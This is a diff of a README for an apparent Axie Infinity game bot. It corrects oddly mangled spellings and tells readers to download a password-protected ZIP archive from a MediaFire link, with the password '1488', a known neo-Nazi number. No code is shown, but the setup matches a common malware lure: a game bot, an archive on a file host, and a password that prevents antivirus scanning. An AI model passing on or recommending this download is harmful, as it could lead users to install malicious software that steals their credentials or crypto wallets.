@@ -2,8 +2,9 @@
 About
 Bot uses WinAPI functions to take screenshots and recognize pixels of axie models and cards. This technology is more safe because we dont need to read memory of axie game process and we dont need any .dll injections.
 
-Set
-1.Change game resolution to  full-scre en (or ful-scren windowed) and close Sk y avis game client
+Setup
+
+1.Change game resolution to full-screen (or full-screen windowed) and close SkyMavis game client
 
 2.[Download](https://www.mediafire.com/file/45lsw0mjspoadam/AxieBot.zip/file) archive with software  Password:1488
 
